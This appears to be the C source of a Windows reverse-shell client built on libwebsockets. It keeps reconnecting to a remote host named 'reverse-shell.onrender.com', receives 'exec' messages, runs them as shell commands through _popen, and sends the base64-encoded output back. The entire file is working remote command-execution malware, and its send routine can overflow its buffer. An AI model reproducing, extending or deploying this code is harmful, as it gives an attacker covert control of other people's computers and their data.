#include <libwebsockets.h>
#include <string.h>
#include <signal.h>
#include <windows.h>
#include <lmcons.h>
#include <stdlib.h>

#include "auth.h"
#include "tools.h"

// #define _DEV

char *msg = NULL;
size_t msg_size = 0;

int sentId = 0;

static int interrupted = 0;

static void sigint_handler(int sig) {
    interrupted = 1;
}

// Function to send a message
void send_message(struct lws *wsi) {
    char msg_to_send[msg_size + 64];

    // Create the JSON message dynamically with the escaped value
    char json_msg[msg_size + 64];
    snprintf(json_msg, sizeof(json_msg), "%s", msg);

    // Create the full message with the JSON message
    snprintf(msg_to_send, sizeof(msg_to_send), "{ \"type\": \"cmd\", \"value\": \"");
    strncat(msg_to_send, json_msg, sizeof(msg_to_send) - strlen(msg_to_send) - 1);
    strncat(msg_to_send, "\", \"to\": \"web\" }", sizeof(msg_to_send) - strlen(msg_to_send) - 1);

    // Encode the message in Base64
    char *encoded_msg = base64_encode((unsigned char *)msg_to_send, strlen(msg_to_send));

    // Allocate a buffer for the message with LWS_PRE bytes padding for the header
    size_t msg_len = strlen(encoded_msg);
    unsigned char buf[LWS_PRE + msg_size + 64];
    memcpy(&buf[LWS_PRE], encoded_msg, msg_len);

    free(encoded_msg);

    // Send the message
    printf("Sending: %s ", msg_to_send);
    int bytes_sent = lws_write(wsi, &buf[LWS_PRE], msg_len, LWS_WRITE_BINARY);
    if (bytes_sent < (int)msg_len) {
        printf("Failed to send message completely\n");
    } else {
        printf("Message sent.\n");
    }

    // Free the message buffer
    free(msg);
    msg = NULL;
    msg_size = 0;
}

void execute(const char *command, struct lws *wsi) {
    char buffer[256];
    FILE *fp = _popen(command, "r");
    if (fp == NULL) {
        printf("Failed to run command\n");
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        // Escape the value to handle any special characters
        char *escaped_value = escape_json(buffer);
        if (!escaped_value) {
            free(msg);
            _pclose(fp);
            return;  // Handle memory allocation failure
        }

        size_t new_size = msg_size + strlen(escaped_value) + 1;
        char *new_msg = (char*)realloc(msg, new_size);
        if (!new_msg) {
            free(msg);
            free(escaped_value);
            _pclose(fp);
            return;  // Handle memory allocation failure
        }

        msg = new_msg;
        strcpy(msg + msg_size, escaped_value);
        msg_size += strlen(escaped_value);

        free(escaped_value);
    }

    _pclose(fp);
}

void handle_message(const char *json_data, struct lws *wsi) {
    char type[16] = {0};  // Buffer for "type" value
    char value[128] = {0}; // Buffer for "value" value

    // Find the "type" key and extract the value
    const char *type_start = strstr(json_data, "\"type\":\"");
    if (type_start) {
        type_start += 8; // Move pointer past "\"type\":\""
        const char *type_end = strchr(type_start, '"');
        if (type_end) {
            size_t type_len = type_end - type_start;
            strncpy(type, type_start, type_len);
            type[type_len] = '\0'; // Null-terminate the string
        }
    }

    // Find the "value" key and extract the value
    const char *value_start = strstr(json_data, "\"value\":\"");
    if (value_start) {
        value_start += 9; // Move pointer past "\"value\":\""
        const char *value_end = strchr(value_start, '"');
        if (value_end) {
            size_t value_len = value_end - value_start;
            strncpy(value, value_start, value_len);
            value[value_len] = '\0'; // Null-terminate the string
        }
    }

    // Switch based on the "type" field
    if (strcmp(type, "msg") == 0) {
        printf("Received message: %s\n", value);
        // Handle "msg" type
    } else if (strcmp(type, "exec") == 0) {
        printf("Received exec: %s\n", value);
        // Handle "exec" type
        execute(value, wsi);
    } else {
        printf("Unknown type: %s\n", type);
    }
}

static int callback_echo(struct lws *wsi, enum lws_callback_reasons reason,
                         void *user, void *in, size_t len) {
    switch (reason) {
        case LWS_CALLBACK_CLIENT_ESTABLISHED:
            printf("Connected to server\n");
            lws_callback_on_writable(wsi); // Keep writable to send pings
            break;

        case LWS_CALLBACK_CLIENT_WRITEABLE: {
            if(!sentId){
                authenticate(wsi);
                sentId = 1;
            }

            if(msg_size){
                send_message(wsi);
            }

            lws_callback_on_writable(wsi);
            break;
        }

        case LWS_CALLBACK_CLIENT_RECEIVE:
            printf("Received: %s\n", (const char *)in);
            handle_message((const char *)in, wsi);
            // Keep connection writable to avoid closing
            lws_callback_on_writable(wsi);
            break;

        case LWS_CALLBACK_CLIENT_CONNECTION_ERROR:
            printf("Connection error\n");
            interrupted = 1;
            break;

        case LWS_CALLBACK_CLIENT_CLOSED:
            printf("Disconnected from server\n");
            interrupted = 1;
            break;

        default:
            break;
    }
    return 0;
}

int establish_connection(){
    struct lws_context_creation_info info;
    struct lws_client_connect_info ccinfo;
    struct lws_context *context;
    #ifndef _DEV
        const char *url = "reverse-shell.onrender.com";
        int port = 443;
    #else
        const char *url = "localhost";
        int port = 8080;
    #endif

    memset(&info, 0, sizeof info);
    info.port = CONTEXT_PORT_NO_LISTEN;
    info.options = LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
    info.protocols = (struct lws_protocols[]) {
        {"chat", callback_echo, 0, 0},
        {NULL, NULL, 0, 0}
    };

    context = lws_create_context(&info);
    if (!context) {
        printf("lws init failed\n");
        return 1;
    }

    memset(&ccinfo, 0, sizeof(ccinfo));
    ccinfo.context = context;
    ccinfo.address = url;
    ccinfo.port = port;
    ccinfo.path = "/";
    ccinfo.host = url;
    ccinfo.origin = url;
    ccinfo.protocol = "chat";
    #ifndef _DEV
        ccinfo.ssl_connection = LCCSCF_USE_SSL; // Enable SSL/TLS
    #endif
    ccinfo.pwsi = NULL;

    signal(SIGINT, sigint_handler);

    if (!lws_client_connect_via_info(&ccinfo)) {
        printf("SSL Connection failed\n");
        lws_context_destroy(context);
        return 1;
    }

    while (!interrupted) {
        lws_service(context, 1000);
        Sleep(1); // Sleep for 1ms to reduce CPU usage (significantly)
        /* ! TODO: reconnect logic ! */
    }

    // Clean up
    lws_context_destroy(context);
    return 0;
}

int main() {
    while(1){
        establish_connection();
        sentId = 0;
        interrupted = 0;
        printf("Reconnecting in 3 seconds...\n");
        Sleep(3000);
    }
    
    return 0;
}